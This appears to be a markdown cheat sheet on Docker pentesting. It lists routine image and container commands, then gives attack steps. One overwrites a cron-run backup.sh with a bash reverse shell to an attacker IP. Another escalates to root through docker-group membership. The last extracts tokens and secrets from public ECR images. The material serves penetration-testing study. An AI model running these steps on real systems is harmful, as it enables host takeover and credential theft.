---
title: Docker Pentesting
description: Docker is a set of platform as a service products that use OS-level virtualization to deliver software in packages called containers.
tags:
    - Container
    - Privilege Escalation
draft: false
---

## Investigation

- **Images**

    ```sh
    # List images
    docker images
    # or
    docker image ls

    # The history of an image
    docker image history <image-name>
    ```

- **Containers**

    ```sh
    # List containers running
    docker container ls
    # or
    docker ps

    # List all containers
    docker container ls -a
    # or
    docker ps -a
    ```

<br />

## Basic Operations

- **Run a New Container**

    ```sh
    # List images and check the image name
    docker images

    # -d: detached mode (background)
    # -p: map the port of the host to the port in the container
    docker run -dp 80:80 <image-name>
    ```

- **Start a Stopped Container**

    ```sh
    # List all containers and check the target ID
    docker container ls -a

    # Start the container
    docker container start <container-id>
    ```

- **Run Commands in a Container**

    ```sh
    # List containers running and check the target container ID
    docker ps

    # Run commands by giving the container ID
    docker exec <container-id> whoami
    docker exec <container-id> cat sample.txt
    ```

- **Stop a Container**

    ```sh
    # List running containers and check the target container ID
    docker ps

    # Stop the container by giving the ID
    docker stop <container-id>
    ```

- **Remove a Container**

    ```sh
    # List all containers and check the target container ID
    docker ps -a

    # Remove the container by givine the ID
    docker rm <container-id>
    # Force to remove the running container (-f)
    docker rm -f <container-id>
    ```

- **Build a Container Image**

    First off, create a **Dockerfile** in the root directory of the project.

    ```sh
    FROM node:12-alpine

    RUN apk add --no-cache python2 g++ make
    WORKDIR /app
    COPY . .
    RUN yarn install --production
    CMD ["node", "src/index.js"]
    ```

    Now run the following command to build the container image.  
    This command uses the Dockerfile.

    ```sh
    # -t: name a tag of the image
    docker build -t <tag-name> .
    ```

- **Scan a Container Image**

    ```sh
    docker scan <image-name>
    ```

- **Remove an Image**

    ```sh
    # List images and check the target image ID
    docker images

    # Remove the image by giving the ID
    docker rmi <image-id>
    ```

- **Publish an Image**

    Before doing below, you need to sign up the Docker Hub and sign in, then create a new repository in your dashboard.

    ```sh
    # Login
    docker login -u <your-username>

    # Tag a new image
    docker tag <source-image> <your-username>/<target-image>

    # Push
    docker push <your-username>/<target-image>
    ```

<br />

## Escape from Container to Desired Machine

1. **Check if the Backup File like "backup.sh" Exists**

    ```sh
    cd /opt/backups
    ls
    ```

2. **Add Reverse Shell Payload to the Backup File**

    If you find the backup file and it's executed automatically at regular intervals by cron, inject the reverse shell payload to escape from the container shell.

    ```sh
    echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' > backup.sh
    # or
    printf '#!/bin/bash\nbash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' > backup.sh
    ```

3. **Open Listner for Waiting the Reverse Shell**

    Use "nc" command to open listener and wait for while running the previous script by cron.

    ```sh
    # In attacker machine, wait for the cron job execute the reverse shell
    nc -lvnp 4444
    ```

4. **Confirmation**

    If you found the computer's name changed, you gained the access to the desired machine successfully.

    ```sh
    user@realhost:~#
    ```

<br />

## Root Privilege Escalation (Docker Group Required)

1. **Check if Current User Belongs to "docker" Group**

    ```sh
    groups
    ```

2. **Gain the Root Shell**

    ```sh
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
    ```

<br />

## Amazon Elastic Container Registry (ECR) Public Gallery

1. **Run the Docker Container**

    - **Retrieve a Container Image**

        ```sh
        docker pull public.ecr.aws/<registry-alias>/<repository>:latest
        ```

    - **Check if It was Pulled**

        ```sh
        docker images
        ```

    - **Run the Container and Interect with It**

        ```sh
        docker run -it public.ecr.aws/<registry-alias>/<repository>:latest
        ```

2. **Get Sensitive Information in the Container**

    You may be able to get the interesting data like **api_key**.

    ```sh
    printenv
    ```

3. **Get Sensitive Information in Local Machine**

    - **Check the Container Config and Retrieve Sensitive Information**

        Process the following flows in your local machine.

        ```sh
        mkdir example
        cd example/
        docker save -o example.tar public.ecr.aws/<registry-alias>/<repository>:latest
        tar -xf example.tar

        # Config files
        cat manifest.json | jq
        cat f9ab.......json | jq

        # Also config file in each directory
        cd 2246f........../
        tar -xvf layer.tar

        # Get sensitive information
        grep -e 'token' -e 'secret' */*
        ```